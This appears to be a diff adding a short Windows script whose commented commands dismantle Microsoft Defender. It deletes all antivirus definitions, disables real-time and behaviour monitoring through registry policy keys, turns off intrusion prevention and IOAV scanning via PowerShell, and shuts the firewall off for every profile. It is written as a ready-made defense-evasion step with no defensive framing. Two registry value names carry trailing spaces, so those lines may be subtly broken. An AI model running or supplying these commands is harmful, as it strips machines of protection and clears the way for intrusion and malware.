@@ -1,0 +1,14 @@
+# Remove Definitions
+cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
+
+# Disable RealTimeProtection through Registry Key
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f
+
+# Disable BehaviourMonitoring through Registry Key
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
+
+# Disable IPS IOAVProtection RealTimeMonitoring through Powershell
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
+
+# Disable local firewall
+NetSh Advfirewall set allprofiles state off 
